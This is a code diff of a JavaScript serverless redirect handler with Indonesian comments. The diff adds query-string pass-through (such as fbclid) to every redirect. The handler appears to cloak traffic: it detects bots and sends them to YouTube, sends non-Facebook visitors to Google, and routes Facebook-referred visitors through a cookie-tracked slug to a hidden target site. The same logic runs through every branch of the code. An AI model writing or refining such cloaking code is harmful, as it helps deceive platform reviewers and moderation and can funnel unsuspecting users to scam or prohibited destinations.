@@ -6,6 +6,7 @@ export default async function handler(req, res) {
   const path = url.pathname;
 
   const cookies = req.headers.cookie || "";
+  const query = url.search; // 🔥 ambil ?fbclid dll
 
   // ===== DETEKSI =====
   const isBot =
@@ -22,17 +23,17 @@ export default async function handler(req, res) {
   // ===== ROOT =====
   if (path === "/") {
 
-    // BOT → YOUTUBE
+    // BOT → YOUTUBE + query ikut
     if (isBot) {
       return res.writeHead(301, {
-        Location: "https://www.youtube.com/"
+        Location: "https://www.youtube.com/" + query
       }).end();
     }
 
-    // NON FB → GOOGLE
+    // NON FB → GOOGLE + query ikut
     if (!isFB) {
       return res.writeHead(301, {
-        Location: "https://www.google.com/"
+        Location: "https://www.google.com/" + query
       }).end();
     }
 
@@ -48,7 +49,7 @@ export default async function handler(req, res) {
     }
 
     return res.writeHead(302, {
-      Location: "/" + slug,
+      Location: "/" + slug + query, // 🔥 query ikut ke slug juga
       "Set-Cookie": `slug=${slug}; path=/; max-age=86400`
     }).end();
   }
@@ -56,7 +57,7 @@ export default async function handler(req, res) {
   // ===== SLUG =====
   if (path !== "/") {
     return res.writeHead(302, {
-      Location: "https://targetlu.com/"
+      Location: "https://targetlu.com/" + query // 🔥 ikut terus
     }).end();
   }
 }
